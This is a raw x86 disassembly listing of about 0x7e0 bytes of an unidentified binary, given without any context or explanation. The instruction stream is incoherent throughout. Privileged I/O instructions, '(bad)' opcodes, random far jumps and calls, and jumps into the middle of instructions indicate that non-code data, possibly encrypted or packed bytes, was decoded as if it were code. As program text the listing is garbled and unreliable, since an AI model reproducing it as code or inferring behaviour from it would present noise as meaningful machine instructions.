  406c7b:	repnz xchg ebp,eax
  406c7d:	dec    esi
  406c7e:	adc    al,0x13
  406c80:	pop    esi
  406c81:	sahf   
  406c82:	sbb    DWORD PTR [edi],edi
  406c84:	sub    eax,0x3cfd1dac
  406c89:	enter  0x9666,0x43
  406c8d:	les    ecx,FWORD PTR [ebx]
  406c8f:	sub    eax,0xcbd6e061
  406c94:	call   ebx
  406c96:	lock fst DWORD PTR [ebx-0x2c]
  406c9a:	push   edx
  406c9b:	js     0x406c94
  406c9d:	icebp  
  406c9e:	inc    ebp
  406c9f:	test   BYTE PTR [ecx],dh
  406ca1:	sar    BYTE PTR [ebp+0xdef3b26],1
  406ca7:	ds or  al,0x18
  406caa:	cmp    eax,0x7400c0df
  406caf:	out    dx,al
  406cb0:	pusha  
  406cb1:	loop   0x406cb0
  406cb3:	cmp    eax,0x4a646e6
  406cb8:	jle    0x406cb0
  406cba:	mov    ah,BYTE PTR [esi-0x1a]
  406cbd:	popf   
  406cbe:	sub    ebp,0x78dfa442
  406cc4:	in     al,0x77
  406cc6:	stc    
  406cc7:	aas    
  406cc8:	sbb    eax,0xef3b7fae
  406ccd:	jbe    0x406cc5
  406ccf:	dec    eax
  406cd0:	aad    0xbf
  406cd2:	cmp    edx,ecx
  406cd4:	add    ebx,DWORD PTR [esi+0x34]
  406cd7:	pop    esp
  406cd8:	jae    0x406c8f
  406cda:	add    BYTE PTR [ebx+0x21e9da12],dl
  406ce0:	adc    al,0x45
  406ce2:	icebp  
  406ce3:	dec    ebp
  406ce4:	outs   dx,BYTE PTR ds:[esi]
  406ce5:	aam    0xb9
  406ce7:	push   ds
  406ce8:	xchg   ebp,eax
  406ce9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406cea:	cmc    
  406ceb:	je     0x406d66
  406ced:	sbb    bh,BYTE PTR [eax-0x47f5f64e]
  406cf3:	jno    0x406cd4
  406cf5:	imul   cl
  406cf7:	aaa    
  406cf8:	das    
  406cf9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406cfa:	daa    
  406cfb:	or     al,0x4a
  406cfd:	push   ebx
  406cfe:	out    0xf2,al
  406d00:	sbb    BYTE PTR [ecx-0x16],ch
  406d03:	lds    esi,FWORD PTR [ebp-0x2]
  406d06:	mov    esi,0xf6abab0
  406d0c:	(bad)  
  406d0d:	xchg   ebp,eax
  406d0e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406d0f:	cli    
  406d10:	fbstp  TBYTE PTR [edi+0x61]
  406d13:	ja     0x406d67
  406d15:	or     DWORD PTR [edi+0x5b4e02b9],esi
  406d1b:	pop    es
  406d1c:	xor    DWORD PTR [esi],esi
  406d1e:	push   0x6dfcabd2
  406d23:	setae  BYTE PTR [eax-0x40]
  406d27:	jp     0x406d23
  406d29:	popf   
  406d2a:	int    0x51
  406d2c:	jl     0x406d11
  406d2e:	cld    
  406d2f:	fiadd  WORD PTR gs:[ebx]
  406d32:	mov    ebx,0x2edbbaf3
  406d37:	out    0xe3,eax
  406d39:	sbb    esp,DWORD PTR [edx+0x30e59aa4]
  406d3f:	sub    eax,0x5d93f44f
  406d44:	lahf   
  406d45:	mov    WORD PTR [ebx+0x63],es
  406d48:	pop    ebx
  406d49:	out    0x77,al
  406d4b:	dec    edi
  406d4c:	dec    ebx
  406d4d:	and    eax,0x30bde298
  406d52:	and    ecx,ebx
  406d54:	cmp    ch,bl
  406d56:	mov    al,ds:0xa51f90b3
  406d5b:	mov    bh,0x25
  406d5d:	mov    al,0xd5
  406d5f:	iret   
  406d60:	mov    cl,0x84
  406d62:	jmp    0x4d235e8f
  406d67:	push   esp
  406d68:	inc    ebp
  406d69:	int3   
  406d6a:	pusha  
  406d6b:	mov    eax,0xddea6b9a
  406d70:	fldln2 
  406d72:	pop    edx
  406d73:	jnp    0x406da7
  406d75:	xchg   ebx,eax
  406d76:	nop
  406d77:	add    edx,0x27
  406d7a:	in     al,0xa0
  406d7c:	addr16 test edx,ebp
  406d7f:	call   0x6e622d83
  406d84:	mov    ds:0xafd0ac0f,eax
  406d8a:	xchg   BYTE PTR [edi],bl
  406d8c:	xlat   BYTE PTR ds:[ebx]
  406d8d:	repz imul esp,eax,0xffffffb2
  406d91:	mov    ecx,0x4902dc2a
  406d96:	push   esp
  406d97:	fnstsw WORD PTR [ebx+0x6a684851]
  406d9d:	dec    edx
  406d9e:	rcr    DWORD PTR [ecx-0x34],0xd1
  406da2:	pop    ebx
  406da3:	push   edi
  406da4:	test   eax,0x52985f8c
  406da9:	pop    ebp
  406daa:	mov    ds:0xc2b7a579,eax
  406daf:	fwait
  406db0:	js     0x406d71
  406db2:	jo     0x406e27
  406db4:	fisubr WORD PTR [ecx]
  406db6:	loop   0x406d8d
  406db8:	outs   dx,DWORD PTR ds:[esi]
  406db9:	lods   eax,DWORD PTR ds:[esi]
  406dba:	or     dh,dh
  406dbc:	sub    edi,ebp
  406dbe:	mov    DWORD PTR [esi],edi
  406dc0:	adc    eax,0x96a02be3
  406dc5:	mov    ds:0x1780de59,eax
  406dca:	es jecxz 0x406e23
  406dcd:	jp     0x406e0b
  406dcf:	dec    esi
  406dd0:	add    ebx,ecx
  406dd2:	fisttp DWORD PTR [ecx+edi*4]
  406dd5:	mov    eax,ds:0x9aa3f1a4
  406dda:	mov    eax,gs:0x8f030945
  406de0:	ret    0x4b32
  406de3:	xchg   edi,eax
  406de4:	sub    BYTE PTR [ecx+0x6ca81bc],bh
  406dea:	fnsave [ebx+eax*4-0x7765bf6d]
  406df1:	pop    edi
  406df2:	xor    esi,DWORD PTR [esi-0x7ee550f8]
  406df8:	sub    ah,ch
  406dfa:	outs   dx,BYTE PTR ds:[esi]
  406dfb:	(bad)  
  406dfc:	mov    ds:0x25e673a3,eax
  406e01:	or     DWORD PTR [esp+ebx*4-0x26d18352],0xffffffce
  406e09:	dec    edx
  406e0a:	js     0x406e0a
  406e0c:	push   edi
  406e0d:	hlt    
  406e0e:	push   eax
  406e0f:	bound  esi,QWORD PTR [edx]
  406e11:	test   al,0xae
  406e13:	daa    
  406e14:	fwait
  406e15:	adc    BYTE PTR [edx+0x6d],cl
  406e18:	out    0x8e,al
  406e1a:	xlat   BYTE PTR ds:[ebx]
  406e1b:	cmc    
  406e1c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406e1d:	push   ebp
  406e1e:	and    al,0xe1
  406e20:	rcl    DWORD PTR [ebx-0x67],0x8e
  406e24:	out    dx,eax
  406e25:	mov    eax,0x77992b2b
  406e2a:	out    dx,al
  406e2b:	retf   0x16b
  406e2e:	xor    ecx,ecx
  406e30:	out    0x60,al
  406e32:	test   al,0x91
  406e34:	sub    al,0x3
  406e36:	add    DWORD PTR [edi],ebp
  406e38:	sub    al,0xc
  406e3a:	int3   
  406e3b:	add    al,BYTE PTR [edx]
  406e3d:	imul   DWORD PTR [edi+0x7d]
  406e40:	push   ds
  406e41:	int3   
  406e42:	mov    bh,0xfc
  406e44:	das    
  406e45:	retf   
  406e46:	push   esi
  406e47:	pop    ss
  406e48:	ret    0xc334
  406e4b:	push   ebp
  406e4c:	sti    
  406e4d:	mov    edx,0x455c8f32
  406e52:	inc    ecx
  406e53:	cmp    eax,0x3e5b8751
  406e58:	adc    eax,0x8b77ffc1
  406e5d:	sbb    eax,0xeadb9228
  406e62:	out    dx,al
  406e63:	or     DWORD PTR [edi],ebx
  406e65:	out    dx,eax
  406e66:	xor    eax,0x80c5bf38
  406e6b:	test   al,0xc9
  406e6d:	sub    BYTE PTR ds:0x46b87c1b,dl
  406e73:	or     edx,DWORD PTR [edx+0x2a8e3543]
  406e79:	sti    
  406e7a:	and    ah,dh
  406e7c:	mov    WORD PTR [ecx*2+0x517a35af],fs
  406e83:	into   
  406e84:	xor    ebp,DWORD PTR [esi+0x4f]
  406e87:	add    BYTE PTR [ecx],ah
  406e89:	inc    esp
  406e8a:	mov    dh,0xf9
  406e8c:	scas   al,BYTE PTR es:[edi]
  406e8d:	jae    0x406f09
  406e8f:	gs in  al,0x3e
  406e92:	xchg   esi,eax
  406e93:	pop    ss
  406e94:	jno    0x406eb3
  406e96:	hlt    
  406e97:	shl    DWORD PTR [eax+0x32],0x50
  406e9b:	cmp    al,0x38
  406e9d:	aam    0x6f
  406e9f:	and    al,0x9
  406ea1:	mov    dl,0x25
  406ea3:	jae    0x406ef5
  406ea5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406ea6:	xchg   esp,esp
  406ea8:	adc    ch,cl
  406eaa:	aas    
  406eab:	cmp    al,0xc2
  406ead:	sub    eax,ebx
  406eaf:	mov    edi,0x6860559e
  406eb4:	ins    BYTE PTR es:[edi],dx
  406eb5:	rcl    ebp,cl
  406eb7:	imul   edx,esp,0x3a53c7bc
  406ebd:	jecxz  0x406edc
  406ebf:	ret    
  406ec0:	in     al,dx
  406ec1:	or     DWORD PTR [ebx],esp
  406ec3:	inc    esi
  406ec4:	jne    0x406ef0
  406ec6:	test   BYTE PTR [ebx],dh
  406ec8:	test   BYTE PTR [edx-0x1d],ah
  406ecb:	retf   
  406ecc:	stos   BYTE PTR es:[edi],al
  406ecd:	pop    ds
  406ece:	cli    
  406ecf:	adc    al,0x1e
  406ed1:	sub    eax,0xdd4c2f17
  406ed6:	mov    ebp,0x365f968e
  406edb:	inc    ecx
  406edc:	test   BYTE PTR [eax-0x2aa68cd0],ah
  406ee2:	shr    al,1
  406ee4:	ins    BYTE PTR es:[edi],dx
  406ee5:	inc    esp
  406ee6:	sub    BYTE PTR [ebx-0x5db06721],ch
  406eec:	push   DWORD PTR [ebp-0x74967ab3]
  406ef2:	dec    esi
  406ef3:	jmp    ecx
  406ef5:	push   eax
  406ef6:	xchg   esi,eax
  406ef7:	fisttp DWORD PTR ds:0xd8df4287
  406efd:	push   cs
  406efe:	jecxz  0x406f1d
  406f00:	cmc    
  406f01:	jnp    0x406ef2
  406f03:	out    dx,eax
  406f04:	cmp    ch,BYTE PTR [ebp-0xe]
  406f07:	jecxz  0x406f49
  406f09:	mov    al,ds:0x57f1a590
  406f0e:	push   0xffffff82
  406f10:	mov    ah,0xa3
  406f12:	fdivp  st(4),st
  406f14:	inc    ebp
  406f15:	and    ebx,DWORD PTR es:[edi+eax*8]
  406f19:	fisubr WORD PTR [esi+0x534e12b0]
  406f1f:	clc    
  406f20:	xor    DWORD PTR [ebx-0x60],esi
  406f23:	fwait
  406f24:	(bad)  
  406f25:	aaa    
  406f26:	pop    ds
  406f27:	xor    eax,0xd511ba49
  406f2c:	(bad)  
  406f2d:	mov    ebx,0x1700ceb4
  406f32:	sbb    ebx,DWORD PTR [ecx-0x70c4c3e6]
  406f38:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  406f3a:	xchg   bh,dl
  406f3c:	sahf   
  406f3d:	cli    
  406f3e:	repnz pushw ss
  406f41:	ret    
  406f42:	(bad)  
  406f43:	test   eax,0xbb6069c2
  406f48:	cld    
  406f49:	mov    bl,0x33
  406f4b:	rcr    DWORD PTR [edx+0x58],0xb3
  406f4f:	cmp    edx,DWORD PTR [ecx]
  406f51:	mov    ds:0x67481b1c,al
  406f56:	jb     0x406efe
  406f58:	sbb    eax,esp
  406f5a:	fwait
  406f5b:	nop
  406f5c:	pop    ebp
  406f5d:	sub    DWORD PTR [edx-0x4f1f5c0b],ebp
  406f63:	fwait
  406f64:	test   DWORD PTR [esp+ecx*2],eax
  406f67:	mov    eax,ds:0x80fedf4c
  406f6c:	sbb    BYTE PTR [ecx],al
  406f6e:	add    al,0x9d
  406f70:	jecxz  0x406f33
  406f72:	out    0x1d,al
  406f74:	or     eax,0x78caaab1
  406f79:	pop    eax
  406f7a:	inc    edi
  406f7b:	or     al,0x4a
  406f7d:	dec    eax
  406f7e:	xchg   edx,eax
  406f7f:	or     al,0x77
  406f81:	adc    al,0x51
  406f83:	stos   BYTE PTR es:[edi],al
  406f84:	or     eax,0x634b0ca7
  406f89:	or     ebp,edx
  406f8b:	push   0xd2b8c56a
  406f90:	inc    ecx
  406f91:	aad    0xf0
  406f93:	sbb    ebx,ecx
  406f95:	cmc    
  406f96:	mov    esi,cs
  406f98:	std    
  406f99:	enter  0x5d6d,0xb2
  406f9d:	pop    ss
  406f9e:	add    BYTE PTR [edx-0x4d19dc36],dl
  406fa4:	shr    BYTE PTR [ebx],cl
  406fa6:	fwait
  406fa7:	mov    al,0xe
  406fa9:	sub    DWORD PTR ds:0x4fab0d58,esi
  406faf:	xchg   ebx,eax
  406fb0:	add    eax,0x3a1f3da9
  406fb5:	sbb    DWORD PTR [ecx-0x2],ebx
  406fb8:	dec    edi
  406fb9:	cmp    edx,ecx
  406fbb:	jge    0x406fc6
  406fbd:	pop    edi
  406fbe:	fisubr DWORD PTR [ecx]
  406fc0:	jecxz  0x407018
  406fc2:	out    0x7b,al
  406fc4:	fidiv  WORD PTR [eax]
  406fc6:	iret   
  406fc7:	ror    DWORD PTR [ebx],1
  406fc9:	mov    ds:0xeb565793,al
  406fce:	xor    bh,dh
  406fd0:	(bad)  
  406fd1:	sbb    eax,0x6b88f1d5
  406fd6:	dec    edi
  406fd7:	imul   ebx,DWORD PTR [ecx],0x5e4a9db0
  406fdd:	pop    esp
  406fde:	lahf   
  406fdf:	mov    ebp,0x29e2d62a
  406fe4:	sub    edi,esi
  406fe6:	sbb    DWORD PTR [ecx+0x8],ebp
  406fe9:	rcr    BYTE PTR [ecx+0x7a355a24],cl
  406fef:	mov    ds:0x5ec65108,al
  406ff4:	or     dh,BYTE PTR [ebx]
  406ff6:	mov    cl,0x7
  406ff8:	loop   0x406f93
  406ffa:	pop    eax
  406ffb:	js     0x407049
  406ffd:	inc    ebx
  406ffe:	fcom   QWORD PTR [ebx]
  407000:	sbb    BYTE PTR [edi+ecx*8-0x7],ch
  407004:	lods   eax,DWORD PTR ds:[esi]
  407005:	cld    
  407006:	outs   dx,DWORD PTR ds:[esi]
  407007:	xor    bl,BYTE PTR [esi+0x52]
  40700a:	sahf   
  40700b:	hlt    
  40700c:	add    ah,BYTE PTR [ebx-0x42]
  40700f:	jb     0x407068
  407011:	and    eax,0xedfc4043
  407016:	jbe    0x406fa7
  407018:	sub    BYTE PTR [esi-0x8],al
  40701b:	jmp    0x8e9d:0x39723b39
  407022:	pop    ecx
  407023:	sti    
  407024:	cmp    al,BYTE PTR [esi]
  407026:	push   ss
  407027:	sbb    eax,0x51707c05
  40702c:	sbb    dh,dh
  40702e:	xchg   BYTE PTR [edi],cl
  407030:	and    al,0xd0
  407032:	mov    esp,edx
  407034:	xor    DWORD PTR [ebx+0x5e],esp
  407037:	xchg   edi,eax
  407038:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407039:	nop
  40703a:	fnstenv ds:0xa31950f
  407040:	(bad)  
  407041:	enter  0xed0e,0xe6
  407045:	jbe    0x406ff9
  407047:	mov    BYTE PTR [eax+0x35a0b9ca],ch
  40704d:	dec    edx
  40704e:	rcl    ch,cl
  407050:	(bad)  
  407051:	cmp    dh,BYTE PTR [ebp+0x61e115fa]
  407057:	retf   
  407058:	cld    
  407059:	(bad)  
  40705a:	adc    al,0xd3
  40705c:	xchg   edi,eax
  40705d:	dec    esp
  40705e:	xor    BYTE PTR [ebp+0x60100220],0x24
  407065:	xlat   BYTE PTR ds:[ebx]
  407066:	call   0xa982e8e5
  40706b:	outs   dx,BYTE PTR ds:[esi]
  40706c:	push   DWORD PTR [edx]
  40706e:	add    al,0x9
  407070:	dec    dh
  407072:	icebp  
  407073:	add    al,0x31
  407075:	adc    ebp,eax
  407077:	sub    bl,BYTE PTR [esi-0x14c32a8c]
  40707d:	cmp    esp,edi
  40707f:	fiadd  WORD PTR [edi-0x510254b1]
  407087:	add    ebp,DWORD PTR [ecx]
  407089:	lahf   
  40708a:	daa    
  40708b:	lahf   
  40708c:	or     al,0x2d
  40708e:	jbe    0x407055
  407090:	pop    ds
  407091:	je     0x407024
  407093:	mov    WORD PTR [ebp+0x6b39769f],cs
  407099:	pop    esi
  40709a:	in     al,0xf8
  40709c:	cdq    
  40709d:	jne    0x4070cd
  40709f:	pop    esp
  4070a0:	fld    DWORD PTR [ecx]
  4070a2:	aam    0x38
  4070a4:	mov    esi,edx
  4070a6:	hlt    
  4070a7:	sub    al,0xbe
  4070a9:	sti    
  4070aa:	retf   0x87b7
  4070ad:	test   eax,0x2e9b2723
  4070b2:	clc    
  4070b3:	ss pop edi
  4070b5:	jge    0x40707d
  4070b7:	enter  0x93e9,0x90
  4070bb:	push   es
  4070bc:	jmp    0x1e90:0x710b9604
  4070c3:	and    al,0xd8
  4070c5:	xchg   ecx,eax
  4070c6:	gs aaa 
  4070c8:	mov    eax,0xf7443e8d
  4070cd:	retf   0xcf14
  4070d0:	push   ebp
  4070d1:	xchg   edi,esp
  4070d3:	imul   ebx,DWORD PTR [edx-0x51e2f066],0x7c
  4070da:	mov    al,0x6b
  4070dc:	popf   
  4070dd:	cmp    ecx,DWORD PTR [eax+0x4f]
  4070e0:	dec    ebx
  4070e1:	push   edi
  4070e2:	and    ebp,DWORD PTR ds:0xa23ffef3
  4070e8:	xchg   DWORD PTR [edx],esi
  4070ea:	loope  0x407140
  4070ec:	mov    cl,0x95
  4070ee:	mov    DWORD PTR [eax],eax
  4070f0:	push   0x1aea0881
  4070f5:	lods   eax,DWORD PTR ds:[esi]
  4070f6:	ret    0xad7c
  4070f9:	cmp    DWORD PTR [ebx-0x72],eax
  4070fc:	mov    dl,0x69
  4070fe:	xchg   BYTE PTR [esi-0x3f],bl
  407101:	jmp    0x88975cd8
  407106:	push   esp
  407107:	mov    ebx,0x6e953914
  40710c:	and    DWORD PTR [ebx-0x47acccb3],ebx
  407112:	lods   al,BYTE PTR ds:[esi]
  407113:	push   ds
  407114:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407115:	mov    esp,0xe8019e54
  40711a:	fnsave [ecx]
  40711c:	clc    
  40711d:	gs jne 0x4070e4
  407120:	(bad)  
  407121:	mov    eax,gs
  407123:	mov    cl,0x6a
  407125:	add    dl,cl
  407127:	push   ecx
  407128:	xor    al,0xc3
  40712a:	retf   0x18eb
  40712d:	jne    0x4070db
  40712f:	mov    ebp,0x4a28a803
  407134:	fisubr WORD PTR [ebx+0x67]
  407137:	and    ecx,ebp
  407139:	aas    
  40713a:	stos   BYTE PTR es:[edi],al
  40713b:	ins    DWORD PTR es:[edi],dx
  40713c:	xchg   esp,esi
  40713e:	jmp    0xd561:0x3e0ce3c0
  407145:	mov    DWORD PTR [eax],esp
  407147:	sbb    eax,0x884ac0c2
  40714c:	ret    0x9c8b
  40714f:	xlat   BYTE PTR ds:[ebx]
  407150:	jb     0x407188
  407152:	sar    ch,1
  407154:	xor    BYTE PTR [ebx+0x73f9afbb],ch
  40715a:	fist   WORD PTR [ebx-0x65]
  40715d:	cmp    al,0xe3
  40715f:	scas   eax,DWORD PTR es:[edi]
  407160:	(bad)  
  407161:	xor    al,0x27
  407163:	gs sbb eax,0xf2b94958
  407169:	jecxz  0x40713a
  40716b:	add    BYTE PTR [eax+eax*4],ch
  40716e:	sbb    al,0xf9
  407170:	adc    bl,BYTE PTR [edx+0x171a0b1a]
  407176:	imul   ebx,DWORD PTR [edi],0xb1603f3
  40717c:	imul   BYTE PTR [ecx-0x1f762d5d]
  407182:	mov    ds:0xe5056326,eax
  407187:	in     al,0x81
  407189:	mov    ebp,0xd10eb2e0
  40718e:	jle    0x40720e
  407190:	dec    ebx
  407191:	sahf   
  407192:	mov    eax,0x4a56ec75
  407197:	cmp    ecx,eax
  407199:	adc    DWORD PTR [eax],0x9
  40719c:	setbe  BYTE PTR [edx-0x3a]
  4071a0:	pop    ebp
  4071a1:	out    dx,al
  4071a2:	or     bh,BYTE PTR [ebx]
  4071a4:	lock cs dec esp
  4071a7:	xchg   ecx,ecx
  4071a9:	pop    ds
  4071aa:	xor    eax,0x44995b4
  4071af:	sub    al,0x4a
  4071b1:	and    eax,0x859869e4
  4071b6:	push   ebx
  4071b7:	mov    ecx,0x6240ccab
  4071bc:	pop    esi
  4071bd:	sbb    BYTE PTR [ebx+0x23],ah
  4071c0:	sub    eax,0x91b87eee
  4071c5:	icebp  
  4071c6:	mov    ah,0x2b
  4071c8:	leave  
  4071c9:	es push ebx
  4071cb:	lahf   
  4071cc:	cmp    dl,ch
  4071ce:	(bad)  
  4071cf:	(bad)
  4071d2:	lahf   
  4071d3:	mov    WORD PTR [ecx],fs
  4071d5:	push   esi
  4071d6:	pop    eax
  4071d7:	shr    DWORD PTR ds:0x2f5a8a29,1
  4071dd:	mov    dl,0xf2
  4071df:	pop    bx
  4071e1:	inc    edi
  4071e2:	das    
  4071e3:	pop    edi
  4071e4:	bound  ebx,QWORD PTR [edi+0x8]
  4071e7:	retf   
  4071e8:	retf   0x33f2
  4071eb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4071ec:	mov    ecx,esi
  4071ee:	jnp    0x4071ae
  4071f0:	cmp    al,0xe7
  4071f2:	mov    ah,0xd2
  4071f4:	pop    ss
  4071f5:	jg     0x4071b8
  4071f7:	push   edx
  4071f8:	mov    al,0x5f
  4071fa:	jmp    0xe33da9c6
  4071ff:	and    al,0x39
  407201:	out    dx,al
  407202:	popf   
  407203:	ror    DWORD PTR [ebx+0x17afcee7],1
  407209:	int3   
  40720a:	in     eax,dx
  40720b:	cmp    eax,0x13
  40720e:	jg     0x407277
  407210:	cli    
  407211:	mov    edx,0xf35d45c1
  407216:	dec    ecx
  407217:	(bad)  
  407218:	mov    DWORD PTR [esi+0x43b577b6],0xfdaf8516
  407222:	sub    DWORD PTR [ebp+0x315d4e17],ebx
  407228:	psraw  mm5,QWORD PTR [edx-0x2e6b4537]
  40722f:	mov    BYTE PTR [eax*1-0x2d3fe09d],cl
  407236:	repnz stos DWORD PTR es:[edi],eax
  407238:	add    ch,BYTE PTR [eax-0x33ed4dfc]
  40723e:	adc    al,0xc1
  407240:	in     al,dx
  407241:	data16 loope 0x4071cc
  407244:	sbb    bh,BYTE PTR [ebp-0x25733389]
  40724a:	inc    ebx
  40724b:	xchg   esp,eax
  40724c:	imul   edi,DWORD PTR [esi],0x3a
  40724f:	adc    ebx,DWORD PTR [edi+edx*2-0x30]
  407253:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407254:	add    BYTE PTR [esi],cl
  407256:	push   ecx
  407257:	arpl   cx,si
  407259:	mov    dl,0xa6
  40725b:	xchg   DWORD PTR [eax+0x7682c7fe],ebx
  407261:	jle    0x40721a
  407263:	push   ds
  407264:	xchg   edi,eax
  407265:	out    dx,al
  407266:	fwait
  407267:	aas    
  407268:	mov    al,ds:0xb74c2b0
  40726d:	jmp    0x4072ec
  40726f:	push   ss
  407270:	jg     0x407299
  407272:	sbb    ah,BYTE PTR [ebp+0x1d041362]
  407278:	jmp    0xd8244e4c
  40727d:	popa   
  40727e:	cmp    al,0xea
  407280:	mov    esi,0x8e307502
  407285:	or     bh,0x15
  407288:	loop   0x407225
  40728a:	dec    edx
  40728b:	push   0xffffff9b
  40728d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40728e:	imul   ecx,DWORD PTR [ebx-0x1bd816d6],0x8
  407295:	fcom   QWORD PTR [eax]
  407297:	retf   0xd646
  40729a:	cmp    DWORD PTR [edx-0x1e],ebx
  40729d:	inc    eax
  40729e:	std    
  40729f:	repz bswap ecx
  4072a2:	les    edx,FWORD PTR [ebx-0x7d]
  4072a5:	push   es
  4072a6:	mov    ebp,0x88b64f5a
  4072ab:	(bad)  
  4072ac:	sub    al,0xbc
  4072ae:	or     bh,BYTE PTR [ebp+0x1b]
  4072b1:	xor    eax,0x33076ddb
  4072b6:	loopne 0x40726b
  4072b8:	push   ds
  4072b9:	cld    
  4072ba:	pop    edi
  4072bb:	ja     0x4072dd
  4072bd:	sbb    DWORD PTR [ebp-0x5a],ecx
  4072c0:	call   0x1a79bcb9
  4072c5:	lods   al,BYTE PTR ds:[esi]
  4072c6:	add    al,0xe0
  4072c8:	cmp    al,0xe4
  4072ca:	xchg   ebx,ecx
  4072cc:	adc    esi,eax
  4072ce:	adc    ecx,DWORD PTR [eax]
  4072d0:	(bad)
  4072d4:	mov    dl,0x7f
  4072d6:	inc    ebp
  4072d7:	pop    ecx
  4072d8:	pop    esi
  4072d9:	fwait
  4072da:	mov    cl,0x60
  4072dc:	push   0x30
  4072de:	(bad)  
  4072df:	push   ecx
  4072e0:	pop    edi
  4072e1:	in     al,dx
  4072e2:	data16 adc cl,BYTE PTR [edi]
  4072e5:	xchg   ebp,eax
  4072e6:	leave  
  4072e7:	push   ebx
  4072e8:	sub    ah,BYTE PTR [ebx+ecx*1-0x4e18b120]
  4072ef:	out    dx,eax
  4072f0:	push   ds
  4072f1:	mov    DWORD PTR [eax-0xa],edx
  4072f4:	test   eax,0x21f09f3a
  4072f9:	je     0x4072d2
  4072fb:	pop    esp
  4072fc:	(bad)  
  4072fd:	jg     0x407362
  4072ff:	mov    eax,0x631bfb92
  407304:	cwd    
  407306:	pop    esp
  407307:	cmp    al,BYTE PTR [ebx-0xa5365c0]
  40730d:	mov    cl,0xb5
  40730f:	push   edx
  407310:	mov    WORD PTR [edx+edx*2+0x74b00545],?
  407317:	push   esi
  407318:	sub    edi,DWORD PTR [eax-0x4c4385e3]
  40731e:	mov    dh,0x11
  407320:	sub    al,0xa7
  407322:	int3   
  407323:	adc    BYTE PTR [esp+ebx*4+0x6d6fac1a],dl
  40732a:	in     al,0xa
  40732c:	enter  0xd714,0xfc
  407330:	push   esp
  407331:	push   eax
  407332:	jmp    0x203:0xacf6cd7a
  407339:	sbb    eax,0xab1ba4f
  40733e:	jns    0x40738d
  407340:	xchg   BYTE PTR [esi],ah
  407342:	ret    0x1cb0
  407345:	mov    edi,0xc6f1aa00
  40734a:	inc    edi
  40734b:	pop    edx
  40734d:	inc    ecx
  40734e:	mov    ds:0xd28ca6fa,al
  407353:	adc    bl,ch
  407355:	dec    ebx
  407356:	aad    0x6e
  407358:	popf   
  407359:	sub    bh,BYTE PTR [edx]
  40735b:	push   esi
  40735c:	add    eax,0x57574b6c
  407361:	fs gs pop edx
  407364:	arpl   WORD PTR [edx],dx
  407366:	or     eax,0xe150dc30
  40736b:	sbb    bh,BYTE PTR [ebx-0x1446f07f]
  407371:	addr16 popa 
  407373:	xchg   edx,eax
  407374:	pop    es
  407375:	out    dx,al
  407376:	xchg   esp,eax
  407377:	dec    edx
  407378:	jae    0x407376
  40737a:	mov    eax,ds:0x7d2943c3
  40737f:	pop    ecx
  407380:	popa   
  407381:	sub    BYTE PTR [ecx+0x53],dh
  407384:	(bad)  
  407385:	popa   
  407386:	in     al,dx
  407387:	iret   
  407388:	or     edx,DWORD PTR [edi+0x5e]
  40738b:	mov    ecx,0x2eb82f69
  407390:	bound  esi,QWORD PTR [ecx-0x7a]
  407393:	xchg   DWORD PTR [ecx],esp
  407395:	pop    ds
  407396:	nop
  407397:	pop    edx
  407398:	sbb    eax,0x72b29e94
  40739d:	cmp    DWORD PTR [esi],ebx
  40739f:	stos   BYTE PTR es:[edi],al
  4073a0:	and    eax,0x6225144
  4073a5:	cs cdq 
  4073a7:	adc    eax,0x99f48d08
  4073ac:	and    eax,0x37528717
  4073b1:	push   0xffffff92
  4073b3:	mov    ecx,0x5b00a20f
  4073b8:	push   0x1a0b54c8
  4073bd:	adc    al,0xa8
  4073bf:	out    0x8e,eax
  4073c1:	push   ebx
  4073c2:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  4073c4:	add    BYTE PTR [eax],bl
  4073c6:	aas    
  4073c7:	addr16 jp 0x4073bb
  4073ca:	mov    ds:0x3e1aa1f7,al
  4073cf:	add    DWORD PTR [ecx-0x66],ebx
  4073d2:	mov    bl,0x36
  4073d4:	repnz enter 0x30d3,0x80
  4073d9:	and    BYTE PTR [ebp+0xdf98774],bh
  4073df:	fwait
  4073e0:	push   edx
  4073e1:	jl     0x4073ad
  4073e3:	call   0x6ff1c259
  4073e8:	stc    
  4073e9:	repnz std 
  4073eb:	into   
  4073ec:	add    ah,al
  4073ee:	push   esi
  4073ef:	sbb    al,al
  4073f1:	je     0x40743e
  4073f3:	fldenv [ecx+0x5f74aaa8]
  4073f9:	mov    bh,0xc9
  4073fb:	mov    ah,0xe7
  4073fd:	in     al,dx
  4073fe:	add    esp,edi
  407400:	pop    ebp
  407401:	add    bh,BYTE PTR [edx]
  407403:	xor    esi,DWORD PTR [eax+0x53]
  407406:	daa    
  407407:	call   0xa9e7:0x255415c
  40740e:	xchg   DWORD PTR [eax-0x546bbe35],edx
  407414:	sbb    bl,BYTE PTR [ebx+0x3c97f4a1]
  40741a:	mov    WORD PTR [ecx-0xd],?
  40741d:	fild   DWORD PTR [ebx-0x3f]
  407420:	mov    al,ds:0xc3379670
  407425:	push   ds
  407426:	xor    edx,ebp
  407428:	test   DWORD PTR [ecx-0x31],esp
  40742b:	xor    DWORD PTR [ebx-0x10],ecx
  40742e:	or     BYTE PTR [edx+0xb],bh
  407431:	pop    esi
  407432:	(bad)  
  407433:	imul   edi,DWORD PTR [ecx+ebp*4],0x52d5b473
  40743a:	mov    edi,DWORD PTR [ebx]
  40743c:	scas   al,BYTE PTR es:[edi]
  40743d:	aam    0xe0
  40743f:	hlt    
  407440:	mov    BYTE PTR [edi],ch
  407442:	inc    edi
  407443:	jg     0x4074bc
  407445:	dec    esp
  407446:	icebp  
  407447:	mov    ds:0x5992f2f0,eax
  40744c:	shr    DWORD PTR [ebx-0x4d82062],1
  407452:	sub    edi,DWORD PTR [edx-0x23517adf]
  407458:	out    0x4e,al
  40745a:	cdq    
  40745b:	lds    eax,FWORD PTR [edx]
